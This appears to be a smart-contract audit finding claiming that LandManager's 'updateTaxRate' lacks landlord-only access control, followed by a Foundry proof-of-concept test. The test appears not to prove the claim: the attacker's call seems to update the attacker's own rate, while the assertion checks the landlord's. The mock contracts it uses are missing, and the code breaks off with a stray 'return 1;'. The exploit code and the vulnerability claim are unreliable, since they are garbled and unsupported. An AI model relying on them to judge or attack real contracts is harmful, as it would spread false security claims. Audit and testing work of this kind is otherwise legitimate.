# Vulnerability details

## Impact
The 'updateTaxRate' function allows users to modify the tax rate. Although it incorporates certain validation checks, it is crucial to ensure that only the landlord has the authority to update their tax rate.

// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.25;

import "forge-std/Test.sol";
import "../src/LandManager.sol";
import "../src/interfaces/ILockManager.sol";
import "../src/interfaces/IAccountManager.sol";
import "../src/interfaces/INFTAttributesManager.sol";
import "openzeppelin-contracts/contracts/token/ERC721/IERC721.sol";

contract LandManagerTest is Test {
    LandManager landManager;
    ILockManager lockManager;
    IAccountManager accountManager;
    IERC721 munchNFT;
    INFTAttributesManager nftAttributesManager;
    address landlord = address(0x1);
    address attacker = address(0x2);

    function setUp() public {
        // Deploy and configure the LandManager contract
        landManager = new LandManager();
        lockManager = ILockManager(address(new MockLockManager()));
        accountManager = IAccountManager(address(new MockAccountManager()));
        munchNFT = IERC721(address(new MockERC721()));
        nftAttributesManager = INFTAttributesManager(address(new MockNFTAttributesManager()));

        // Initialize the LandManager contract
        landManager.initialize(address(new MockConfigStorage(
            address(lockManager),
            address(accountManager),
            address(munchNFT),
            address(nftAttributesManager)
        )));

        // Register landlord and attacker
        vm.prank(landlord);
        accountManager.registerPlayer(landlord);
        vm.prank(attacker);
        accountManager.registerPlayer(attacker);

        // Set initial plot metadata for landlord
        vm.prank(landlord);
        landManager.triggerPlotMetadata();
    }

    function testUpdateTaxRateUnauthorized() public {
        uint256 newTaxRate = 5;

        // Attacker tries to update the tax rate of the landlord
        vm.prank(attacker);
        landManager.updateTaxRate(newTaxRate);

        // Check if the tax rate was updated
        (uint256 lastUpdated, uint256 currentTaxRate) = landManager.plotMetadata(landlord);
        assertEq(currentTaxRate, newTaxRate, "Tax rate should be updated by attacker");
    }
}

contract MockConfigStorage {
    address lockManager;
    address accountManager;
    address munchNFT;
    address nftAttributesManager;

    constructor(address _lockManager, address _accountManager, address _munchNFT, address _nftAttributesManager) {
        lockManager = _lockManager;
        accountManager = _accountManager;
        munchNFT = _munchNFT;
        nftAttributesManager = _nftAttributesManager;
    }

    function getAddress(bytes32 key) external view returns (address) {
        if (key == StorageKey.LockManager) return lockManager;
        if (key == StorageKey.AccountManager) return accountManager;
        if (key == StorageKey.MunchNFT) return munchNFT;
        if (key == StorageKey.NFTAttributesManager) return nftAttributesManager;
        return address(0);
    }

        return 1;
